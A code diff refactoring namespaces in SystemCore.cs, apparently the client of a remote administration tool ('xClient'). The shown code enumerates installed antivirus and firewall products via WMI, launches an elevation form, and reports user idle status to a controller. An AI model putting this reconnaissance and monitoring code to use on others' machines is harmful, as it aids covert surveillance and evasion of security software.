@@ -1,6 +1,4 @@
-﻿using Client;
-using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
@@ -10,8 +8,10 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Windows.Forms;
+using Microsoft.Win32;
+using xClient.Config;
 
-namespace Core
+namespace xClient.Core
 {
     class SystemCore
     {
@@ -159,7 +159,7 @@ namespace Core
             try
             {
                 string AntivirusName = string.Empty;
-                string Scope = (Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                string Scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string Query = "SELECT * FROM AntivirusProduct";
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(Scope, Query);
                 foreach (ManagementObject Mobject in searcher.Get())
@@ -178,7 +178,7 @@ namespace Core
             try
             {
                 string FirewallName = string.Empty;
-                string Scope = (Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                string Scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                 string Query = "SELECT * FROM FirewallProduct";
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(Scope, Query);
                 foreach (ManagementObject Mobject in searcher.Get())
@@ -230,7 +230,7 @@ namespace Core
 
             Thread.Sleep(3000);
 
-            Application.Run(new Elevation.frmElevation());
+            Application.Run(new global::xClient.Core.Elevation.frmElevation());
 
             Thread.Sleep(200);
 
@@ -270,7 +270,7 @@ namespace Core
                     if (lastStatus != "Idle")
                     {
                         lastStatus = "Idle";
-                        new Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
+                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                     }
                 }
                 else
@@ -278,7 +278,7 @@ namespace Core
                     if (lastStatus != "Active")
                     {
                         lastStatus = "Active";
-                        new Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
+                        new global::xClient.Core.Packets.ClientPackets.UserStatus(lastStatus).Execute(Program._Client);
                     }
                 }
             }
